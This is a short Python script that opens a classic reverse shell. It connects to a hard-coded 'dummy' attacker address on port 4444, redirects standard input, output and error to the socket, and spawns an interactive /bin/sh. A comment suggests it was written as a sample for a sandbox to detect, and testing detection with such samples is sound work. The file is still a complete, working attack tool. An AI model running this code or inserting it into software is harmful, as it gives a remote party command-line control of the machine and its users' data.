import socket
import subprocess
import os

def reverse_shell():
    """A classic reverse shell attempt to give a remote attacker command line access."""
    # Target attacker IP (Dummy)
    attacker_ip = "10.10.10.10"
    port = 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, port))
        
        # Redirect standard input, output, and error to the socket
        # This is the 'holy grail' of malicious network pings for your sandbox to catch
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn the shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Connection to attacker failed: {e}")

if __name__ == "__main__":
    reverse_shell()